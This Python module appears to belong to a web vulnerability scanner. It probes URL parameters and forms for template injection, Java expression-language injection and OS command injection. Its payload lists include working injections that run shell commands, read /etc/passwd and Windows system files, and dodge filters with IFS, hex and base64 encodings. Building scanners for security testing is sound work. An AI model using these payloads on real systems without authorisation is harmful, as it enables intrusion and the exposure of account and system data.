"""
Remote Code Execution (RCE) & Server-Side Template Injection (SSTI) Scanner.

Detection methods:
1. SSTI: 16+ payloads — Jinja2, Twig, Freemarker, Velocity, Pebble, Smarty, Mako, EL
2. OS command injection: 22+ payloads with output detection
   - ${IFS} space bypass, bash hex, printf encoding, backtick nesting
   - Windows-specific: whoami, net user, ipconfig
3. Time-based command injection (Linux + Windows)
4. Expression Language (EL) injection for Java
5. Form-based testing for all categories

Anti-false-positive measures:
- Uses astronomically unique math results (no natural occurrence)
- Baseline comparison for all indicators
- Time-based findings verified with multiple rounds
- WAF detection throughout
"""

import time
from core.http_client import get
from core.config import ScannerConfig
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding,
)
from core.utils import inject_into_params, get_forms, submit_form

# ── SSTI payloads with unique results (16 — multi-engine) ──
SSTI_PAYLOADS = [
    # Jinja2 / Twig
    ("{{9876*5432}}", "53646432"),
    ("{{9876*5432}}", "53646432"),
    # Generic template expression
    ("${9876*5432}", "53646432"),
    ("<%= 9876*5432 %>", "53646432"),
    ("#{9876*5432}", "53646432"),
    ("{{=9876*5432}}", "53646432"),
    ("${{9876*5432}}", "53646432"),
    # Jinja2 specific
    ("{{config.__class__.__init__.__globals__['os'].popen('echo 53646432').read()}}", "53646432"),
    ("{% set x = 9876*5432 %}{{x}}", "53646432"),
    # Twig specific
    ("{{9876*5432|abs}}", "53646432"),
    # Freemarker
    ("${9876?c}", "9876"),
    ("<#assign x=9876*5432>${x}", "53646432"),
    # Velocity
    ("#set($x=9876*5432)$x", "53646432"),
    # Pebble
    ("{% set x = 9876*5432 %}{{x}}", "53646432"),
    # Smarty
    ("{math equation='9876*5432'}", "53646432"),
    # Mako
    ("${9876*5432}", "53646432"),
]

# ── Expression Language injection (Java EL) ──
EL_PAYLOADS = [
    ("${9876*5432}", "53646432"),
    ("${applicationScope}", "javax."),
    ("${Runtime.getRuntime().exec('echo 53646432')}", "53646432"),
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "uid="),
    ("${T(java.lang.System).getenv()}", "PATH"),
    ("#{9876*5432}", "53646432"),
]

# ── OS command injection payloads with expected indicators (22) ──
SHELL_PAYLOADS = [
    # Basic separators — Linux
    (";id", ["uid=", "gid="]),
    ("|id", ["uid=", "gid="]),
    ("$(id)", ["uid=", "gid="]),
    ("`id`", ["uid=", "gid="]),
    ("&&id", ["uid=", "gid="]),
    ("||id", ["uid=", "gid="]),
    # File read — Linux
    (";cat /etc/passwd", ["root:x:0:0"]),
    ("|cat /etc/passwd", ["root:x:0:0"]),
    (";uname -a", ["Linux", "Darwin"]),
    # Space bypass techniques
    (";cat${IFS}/etc/passwd", ["root:x:0:0"]),
    (";cat$IFS/etc/passwd", ["root:x:0:0"]),
    (";{cat,/etc/passwd}", ["root:x:0:0"]),
    (";cat</etc/passwd", ["root:x:0:0"]),
    # Hex / printf encoding
    (";$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')", ["root:x:0:0"]),
    (";$'\\x63\\x61\\x74' /etc/passwd", ["root:x:0:0"]),
    # Backtick nesting
    (";`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`", ["root:x:0:0"]),
    # Windows-specific
    ("| type C:\\Windows\\win.ini", ["[extensions]", "[fonts]"]),
    ("& type C:\\Windows\\win.ini", ["[extensions]", "[fonts]"]),
    ("|whoami", ["\\", "AUTHORITY"]),
    ("& whoami", ["\\", "AUTHORITY"]),
    ("| net user", ["Administrator", "User accounts"]),
    ("| ipconfig", ["IPv4", "Subnet Mask", "Default Gateway"]),
]

# ── Time-based command injection (Linux + Windows) ──
TIME_SHELL_PAYLOADS = [
    # Linux sleep
    (";sleep 5", 5),
    ("|sleep 5", 5),
    ("$(sleep 5)", 5),
    ("`sleep 5`", 5),
    ("&&sleep 5", 5),
    ("||sleep 5", 5),
    # Space bypass sleep
    (";sleep${IFS}5", 5),
    # Windows timeout/ping
    ("& ping -n 6 127.0.0.1", 5),
    ("| ping -n 6 127.0.0.1", 5),
    ("& timeout /t 5 /nobreak", 5),
]


def test_rce(url):
    baseline = get_baseline(url, get)

    # ── 1. SSTI (params) ──
    for payload, expected in SSTI_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                if expected in r.text and expected not in baseline["text"]:
                    signals = {
                        "math_eval": True,
                        "response_diff": diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD,
                    }
                    confidence = calculate_confidence(signals)
                    if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                        return make_finding(
                            url, "Server-Side Template Injection (SSTI)", confidence, signals,
                            details=f"'{payload}' evaluated to '{expected}' in param '{param}'",
                            severity="Critical", payload=payload,
                            evidence=expected, parameter=param,
                        )
            except Exception:
                continue

    # ── 2. SSTI (forms) ──
    forms = get_forms(url)
    for payload, expected in SSTI_PAYLOADS[:8]:
        for form in forms:
            try:
                r = submit_form(form, url, payload)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                if expected in r.text and expected not in baseline["text"]:
                    signals = {
                        "math_eval": True,
                        "response_diff": diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD,
                    }
                    confidence = calculate_confidence(signals)
                    if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                        return make_finding(
                            url, "SSTI (Form-Based)", confidence, signals,
                            details=f"'{payload}' evaluated to '{expected}' via form",
                            severity="Critical", payload=payload, evidence=expected,
                        )
            except Exception:
                continue

    # ── 3. Expression Language injection (Java) ──
    for payload, expected in EL_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                if expected in r.text and expected not in baseline["text"]:
                    signals = {
                        "math_eval": True,
                        "response_diff": diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD,
                    }
                    confidence = calculate_confidence(signals)
                    if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                        return make_finding(
                            url, "Expression Language Injection (Java EL)", confidence, signals,
                            details=f"EL '{payload}' evaluated in param '{param}'",
                            severity="Critical", payload=payload,
                            evidence=expected, parameter=param,
                        )
            except Exception:
                continue

    # ── 4. OS Command Injection (params) ──
    for payload, indicators in SHELL_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for ind in indicators:
                    ind_lower = ind.lower()
                    if ind_lower in text_lower and ind_lower not in baseline["text_lower"]:
                        signals["error_string"] = True
                        evidence = ind
                        break

                signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD

                if not signals.get("error_string"):
                    continue

                # Multi-signal: check for multiple indicators
                matched_count = sum(1 for ind in indicators if ind.lower() in text_lower and ind.lower() not in baseline["text_lower"])
                if matched_count > 1:
                    signals["multi_signal"] = True

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "Remote Code Execution (RCE)", confidence, signals,
                        details=f"Command output '{evidence}' in param '{param}'",
                        severity="Critical", payload=payload,
                        evidence=evidence, parameter=param,
                    )
            except Exception:
                continue

    # ── 5. OS Command Injection (forms) ──
    for payload, indicators in SHELL_PAYLOADS[:10]:
        for form in forms:
            try:
                r = submit_form(form, url, payload)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for ind in indicators:
                    ind_lower = ind.lower()
                    if ind_lower in text_lower and ind_lower not in baseline["text_lower"]:
                        signals["error_string"] = True
                        evidence = ind
                        break

                if not signals.get("error_string"):
                    continue

                signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "RCE (Form-Based Command Injection)", confidence, signals,
                        details=f"Command output '{evidence}' via form",
                        severity="Critical", payload=payload, evidence=evidence,
                    )
            except Exception:
                continue

    # ── 6. Time-based Command Injection ──
    for payload, delay in TIME_SHELL_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                start = time.time()
                r = get(crafted_url, timeout=delay + 5)
                elapsed = time.time() - start

                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                if elapsed >= (delay - 0.5) and elapsed > (baseline["elapsed"] + ScannerConfig.TIME_THRESHOLD):
                    if baseline["elapsed"] >= 2.0:
                        continue

                    verify_ok = True
                    for _ in range(ScannerConfig.TIME_VERIFY_ROUNDS):
                        start_v = time.time()
                        try:
                            get(crafted_url, timeout=delay + 5)
                            v_elapsed = time.time() - start_v
                            if v_elapsed < (delay - 1.0):
                                verify_ok = False
                                break
                        except Exception:
                            verify_ok = False
                            break

                    if verify_ok:
                        signals = {
                            "timing_anomaly": True,
                            "verified": True,
                        }
                        confidence = calculate_confidence(signals)
                        if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                            return make_finding(
                                url, "Command Injection (Time-Based)", confidence, signals,
                                details=f"{elapsed:.1f}s delay via param '{param}'",
                                severity="Critical", payload=payload, parameter=param,
                            )
            except Exception:
                continue

    return None
